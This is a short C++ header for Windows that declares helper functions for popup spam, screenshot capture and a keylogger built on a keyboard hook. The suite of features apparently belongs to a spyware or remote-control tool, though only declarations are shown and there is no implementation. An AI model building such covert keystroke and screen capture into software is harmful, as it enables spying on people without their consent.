#pragma once
#include <string>
#include <Windows.h>
#include <vector>

static constexpr size_t SLEEP_BETWEEN_POPUPS_MILLIS = 100;
static std::vector<DWORD> key_logger_key_codes;

namespace win_utils {
	bool do_popup(const std::string& window_name, const std::string& text, const DWORD flags);

	void do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags);

	std::string take_screenshot();
	
	BOOL GetMessageWithTimeout(MSG* msg, UINT to);

	std::string log_keys(size_t duration_seconds);

	LRESULT CALLBACK log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam);
}
